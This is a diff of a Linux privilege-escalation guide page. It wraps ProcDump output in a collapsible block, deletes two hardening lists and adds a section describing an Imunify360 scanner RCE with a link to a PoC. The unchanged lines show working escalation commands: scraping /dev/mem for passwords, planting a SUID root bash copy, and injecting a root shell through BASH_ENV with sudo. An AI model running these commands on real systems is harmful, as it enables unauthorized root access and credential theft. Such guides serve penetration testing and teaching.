@@ -306,7 +306,10 @@ strings /dev/mem -n10 | grep -i PASS
 
 ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. Get it in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
 
-```
+<details>
+<summary>ProcDump example output</summary>
+
+```text
 procdump -p 1714
 
 ProcDump v1.2 - Sysinternals process dump utility
@@ -332,6 +335,9 @@ Press Ctrl-C to end monitoring without terminating the process.
 [20:20:58 - INFO]: Timed:
 [20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
 ```
+
+</details>
+
 
 ### Tools
 
@@ -414,14 +420,6 @@ cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
 ```bash
 /tmp/rootshell -p   # root shell
 ```
-
-Hardening
-- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
-- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
-- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
-- Enable audit/logging for on-demand job executions
-
-
 
 Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
 
@@ -955,10 +953,6 @@ BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/
 # You should now have a root shell
 ```
 
-- Hardening:
-  - Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
-  - Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
-  - Consider sudo I/O logging and alerting when preserved env vars are used.
 
 ### Sudo execution bypassing paths
 
@@ -1745,6 +1739,15 @@ Learn more and see a generalized pattern applicable to other discovery/monitorin
 
 {{#ref}}
 vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
+{{#endref}}
+
+## Imunify360 Ai‑Bolit deobfuscation RCE (abusing AV/scanner deobfuscators)
+
+Imunify360's PHP deobfuscation engine executed attacker-recovered function names (via call_user_func_array), enabling sinks like system/exec/eval during scans. If Ai‑Bolit runs as root, dropping a crafted PHP anywhere it scans yields RCE during routine scans. See details and PoC:
+
+
+{{#ref}}
+imunify360-ai-bolit-deobfuscation-rce.md
 {{#endref}}
 
 ## Kernel Security Protections
